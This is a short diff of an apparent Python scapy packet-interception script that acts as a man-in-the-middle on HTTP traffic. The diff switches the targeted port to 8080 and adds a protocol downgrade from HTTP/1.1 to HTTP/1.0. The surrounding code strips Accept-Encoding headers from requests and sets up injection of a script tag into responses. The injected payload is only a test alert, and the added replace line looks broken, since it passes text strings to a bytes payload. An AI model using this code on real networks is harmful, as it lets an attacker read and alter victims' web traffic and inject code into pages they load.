@@ -13,12 +13,13 @@ def set_load(packet, load):
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
-        if scapy_packet[scapy.TCP].dport == 80:
+        if scapy_packet[scapy.TCP].dport == 8080:
             print("HTTP Request")
             modified_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load)
+            modified_load = modified_load.replace("HTTP/1.1", "HTTP/1.0")
             new_packet = set_load(scapy_packet, modified_load)
             packet.set_payload(bytes(new_packet))
-        elif scapy_packet[scapy.TCP].sport == 80:
+        elif scapy_packet[scapy.TCP].sport == 8080:
             print("HTTP Response")
             injection_code = b"<script>alert('test')</script>"
             injection_code_len = len(injection_code)
